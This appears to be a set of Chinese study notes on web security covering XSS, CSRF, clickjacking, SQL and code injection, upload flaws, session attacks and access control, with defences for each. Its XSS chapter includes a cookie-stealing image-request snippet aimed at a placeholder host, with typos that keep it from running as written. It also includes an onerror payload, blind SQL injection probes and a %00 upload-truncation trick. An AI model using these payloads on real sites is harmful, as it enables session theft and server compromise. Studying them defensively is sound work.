第一部分：

第一章 安全观
安全三要素：机密性 完整性 可用性
安全评估过程：资产等级划分（一般是数据）  威胁分析（伪装，篡改，抵赖，信息泄露，拒绝服务，提升权限）  风险分析（高，中，低风险）  确定解决方案（能有效解决问题，用户体验好）
高内聚，低耦合，易扩展
白名单，黑名单，最小权限原则，纵深防御原则，数据与代码分离，不可预测性原则。

第二部分：

第二章 浏览器安全：
主机 端口 协议 域名构成同源策略
<script><img>等带src属性的标签。能跨域加载资源，实际是执行的GET请求。运行的源还是本页面。但是浏览器限制javascript权限，不能读写返回的内容。
dom cookie xmlhttprequest 和第三方插件如flash，会受同源策略限制。

第三章 跨站脚本攻击 XSS：
反射型XSS，只是把用户输入的数据反射给浏览器。
存储型XSS，把用户输入的数据存储在服务器端。
DOM based XSS，修改DOM节点形成的XSS。
1.cookie劫持 document.cookie
2.构造GET和POST请求。
var img = documnet.creatElement("img");
img.src = http://www.xxx.com/xx.do?cookie=?&id=?
document.body.appendChild(img);
JS构造表单，自动提交。或者ajax自动提交
3.XSS钓鱼
通过读取当前页面内容，获取验证码图片URL，发送到远程服务器上，通过远程XSS后台接受当前验证码，返回给当前XSS，绕过验证码。
修改密码输入旧密码时，通过伪装登录框获取密码。
4.识别用户浏览器，对浏览器内存攻击
navigator.userAgent,  userAgent可以通过浏览器插件伪造和屏蔽。通过浏览器不同的独有对象。能准确识别浏览器。比如window.Iterator火狐
5.识别用户安装的软件 
var obj = new ActiveXObject("XunLeiBHO.ThunderIEHelper");//迅雷
有些第三方软件如Flash能泄露电脑硬件信息，浏览器插件也会泄露。
6.XSS攻击平台
Attack API    /   BeEF    / XSS-Proxy   
7.XSS Worm
一般用户之间存在交互的行为，如果存在存储型XSS，则比较容易发生XSS Worm攻击。比如用户留言。 而资料设置页面等等，即便存在XSS，也不会发生XSS Worm传播。
案列：百度空间蠕虫事件。
8.构造XSS
（1）利用字符编码 %c1\ 是一个字符 \"转义字符就会失效。
（2）绕过长度限制
（3）<base>标签 需要过滤
（4）代码XSS jQuery中的html("<img src=# onerror=alert(1) />"); 
XSS 防御：
1.HttpOnly 浏览器禁止访问带有HttpOnly的cookie
2.输入检查 输出检查  XSS Filter开源框架。
3.对字符输出做编码

第四章 跨站点请求伪造 CSRF
1.以用户的身份在第三方站点执行请求操作。
2.浏览器cookie限制，session-cookie 临时会话cookie  third-party cookie 本地cookie
IE，safari会拦截第三方本地cookie 如： img iframe script link 等等标签会被拦截第三方cookie发送。 而火狐，谷歌不会拦截第三方cookie
但是P3P头设置后，所有浏览器都会允许发送第三方cookie 
3.get post flash 都会存在CSRF 和 CSRF Worm
4.防御CSRF：
（1）验证码，但是不能所有业务功能都加验证码。体验做不到。
（2）referer检查 ，但是并非所有请求都能得到referer，比如https到http，就不会有referer。另外有些请求头能设置自定义referer。
（3）CSRF本质是所有请求参数都能被攻击者猜测到。所以用不可预测原则防止。如：MD5(salt+value)算法，但是这样后数据改变较大。普通参数不好分析处理。
因此可以用新增参数token来防止。token可以放在服务器session中或者本地cookie中。浏览器端尽量放在form表单中。但是它的目的并不是防止表单重复提交。
CSRF安全是建立在XSS安全之上的。不然token依然会泄露。

第五章 点击劫持 ClickJacking
1.点击劫持是一种视觉上的欺骗，攻击者使用一个透明的iframe，覆盖在一个网页上，然后诱使用户在上面操作。在用户不知道情况的下，点击操作透明的iframe页面。
浏览器，flash，都会出现点击劫持，或者图片覆盖，拖拽劫持和数据窃取。触屏劫持。
2.防御点击劫持：
写一段javaScript代码，禁止iframe嵌套。这种方法叫frame busting,但是控制效果不好，容易被绕过。
利用HTTP头，X-Frame-Options    DENY禁止加载任何frame页面。  SAMEORIGIN允许加载同源域名下的frame。 ALLOW-FROM origin可以自定义加载frame。

第六章 HTML5安全
1.iframe的sandbox属性设置，黑名单标签设置需要注意 Canvas破解验证码

第三部分 服务器端应用安全

 第七章 注入攻击
1.SQL注入 用户能够控制数据的输入 原本要执行的代码，拼接了用户的输入。这个拼接是关键。
盲注 and 1=1  ，  and 1=2 
2.防御SQL注入：使用预编译语句，绑定变量。辅助输入过滤和编码方式
3.XML注入 同HTML注入，需要过滤，编码，检查数据。
4.代码注入 如：eval()函数。 java的脚本工具类ScriptEngine类等。 JSP的动态include也能导致代码注入  少使用危险函数，过滤检查数据
注入攻击是应用违背了数据与代码分离的原则。是可以彻底杜绝的。

第八章 文件上传漏洞
定义：用户上传可执行的脚本，并通过脚本文件获得执行服务器端命令的能力。webshell问题。
1.上传的是web脚本语言，服务器的WEB容器解释并执行了用户上传的脚本。
2.flash策略配置文件。
3.上传的是病毒和木马文件，诱骗用户和管理员下载执行。
4.上传的是钓鱼或包含脚本的图片。在某些浏览器上被视作脚本执行，用于钓鱼和欺骗。
首先，上传的文件要被服务器执行，必须在服务器目录。其次，用户必须能够访问到这个文件。最后，这个文件不能被安全监测，格式化，压缩等。
这样才能算是攻击漏洞。
文件名检查注意：
例如：%00 会被当成截断字符，无法正确判断文件后缀名。XXX.JSP%00.JPG 则会认为是XXX.JSP 
文件头检查注意：
绕过文件头，脚本在文件头后面。
注意历史服务器，IIS等历史BUG。
安全：
1.文件上传的目录为不可执行
2.检查文件类型，结合MIME Type，后缀检查。使用白名单检查，黑名单被无数次证明是不靠谱的。对图片的处理可以压缩，破坏内部可能包含HTML代码。
3.使用随机数改写文件名称或路径
4.设置独立的文件服务器域名，这样由于浏览器同源策略，一系列客户端攻击将失效。

第九章 认证与会话管理
概念：
认证和授权  
认证就是验证凭证的过程，一个凭证被用于认证叫单因素认证 多个凭证用于被认证叫多因素认证。
多因素认证安全强度高于单因素认证。但是用户体验不方便。
登录密码认证：
尽量大于6位，数字字母结合。存储密码时使用不可逆算法。如MD5，还可以加salt值后MD5。使彩虹表暴力破解失效。
登录后session认证：
常见就是将sessionID保存在cookie中，保存在URL中安全性不好。由于手机浏览器有些不支持cookie，保存在URL中有漏洞。
如攻击者先发送一个图片到用户QQ邮箱，用户查看邮箱时就是一次get请求，就容易发送referer，附带sessionID。
sessionID必须唯一。否者会出现用户混淆后果。
session fixation攻击：
攻击者生成一个带未认证的sessionID的URL，使用户用这个URL去认证，这样攻击者就拥有了sessionID。
解决方法就是登录后重写sessionID
session 保持攻击：
有些应用为使用户体验好，不设置session过期时间，攻击者通过不断请求，使sessionID一直存活。
解决方法是强制让session一定时间后销毁，或者用户IP,浏览器变化时销毁session并要求重新登录。
单点登录 SSO
将风险集中在单点环境。有利有弊

第十章 访问控制
权限概念
基于URL的权限访问，基于方法的权限访问，基于数据的权限访问。
把需要保护的页面藏起来并不是办法。基于权限管理才是根本。
垂直权限管理：
RBAC role-based access control 基于角色的访问控制。    用户-角色-权限
spring security中的权限管理就是RBAC的实现。两种实现：基于URL和method访问。
水平权限管理：
由于业务灵活多变，垂直权限管理不方便灵活。有些漏洞通过修改ID即可查看相关不同用户的数据。
基于数据的访问控制则不会出现这些问题。
但是由于有些数据有，有些数据没有这些访问控制要求，对系统改动，可能涉及跨表跨库查询，性能也受到影响。
导致现在并没有很通用的解决方案。对于简单的数据访问控制，可用组group的概念来解决。
水平权限管理是个难题，难以发现，难以通用的框架下解决。
在设计时使用最小权限法则好，默认采取无权限操作是最佳实践。才不会出现越权问题。

第十一章 加密算法和随机数
使用HMAC代替MD5.并且加salt 不要使用自己实现的算法。使用语言官方推荐的算法。不要使用伪随机数。

第十二章 WEB框架安全
MVC模式 在合适的地方做合适的事情。
view层考虑编码输出 model检查 control过滤
Spring MVC 3.0.0-3.0.3 2.5.0-2.5.7版本命令执行漏洞

第十三章 应用层拒绝服务攻击 DDOS
网络层DDOS TCP三次握手协议，大量伪IP请求，请求后无响应服务端，导致服务端不断重连，直到超时放弃。 商业设备对抗。
应用层DDOS TCP已经建立，IP都是真实的。对每个客户端通过IP和cookie定位做一个请求频率的限制。
但是由于代理服务器或者cookie清空。不容易定位唯一客户端
所以服务端性能要好，架构要做好优化。验证码等。本周是对有限的资源无限制的使用造成的。
安全域，分布式防火墙。分析网络连接，频率，地域，客户端信息。等

第十四章 PHP安全

第十五章 WEB Server配置安全

第四篇 互联网公司安全运营
第十六章 互联网业务安全

第十七章 安全开发流程

第十八章 安全运营
















































































































